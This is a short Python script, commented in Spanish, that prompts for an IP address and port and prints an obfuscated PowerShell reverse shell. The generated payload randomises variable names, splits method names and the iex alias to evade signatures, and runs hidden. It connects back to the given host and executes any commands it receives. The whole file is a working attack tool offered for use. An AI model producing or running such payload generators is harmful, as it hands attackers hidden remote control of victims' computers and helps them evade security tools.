import random
import string

def generate_obfuscated_powershell_script(ip, port):
    # Función para generar nombres de variables aleatorios
    def random_var_name(size=4):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))

    # Plantilla del script de PowerShell
    template = """
Start-Process $PSHOME\\powershell.exe -ArgumentList {{
    ${var1} = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
    ${var2} = ${var1}.$('Get'+'Stream')();
    [byte[]]${var3} = 0..65535|%{{0}};
    while((${var4} = ${var2}.Read(${var3}, 0, ${var3}.Length)) -ne 0) {{
        ${var5} = (New-Object -TypeName System.Text.ASCIIEncoding).$('Get'+'String')(${var3},0, ${var4});
        ${var6} = (i''ex ${var5} 2>&1 | Out-String);
        ${var7} = ${var6} + 'PS ' + (pwd).Path + '> ';
        ${var8} = ([text.encoding]::ASCII).$('Get'+'Bytes')(${var7});
        ${var2}.Write(${var8},0,${var8}.Length);
        ${var2}.Flush();
    }};
    ${var1}.Close();
}} -WindowStyle Hidden
"""

    # Generar nombres de variables aleatorios
    variables = {f"var{i}": random_var_name() for i in range(1, 9)}

    # Rellenar la plantilla con la IP, el puerto y los nombres de variables aleatorios
    script = template.format(ip=ip, port=port, **variables)
    return script

# Preguntar al usuario por la IP y el puerto
ip = input("Ingresa la dirección IP: ")
port = input("Ingresa el puerto: ")

# Generar y mostrar el script de PowerShell obfuscado
ps_script = generate_obfuscated_powershell_script(ip, port)
print(ps_script)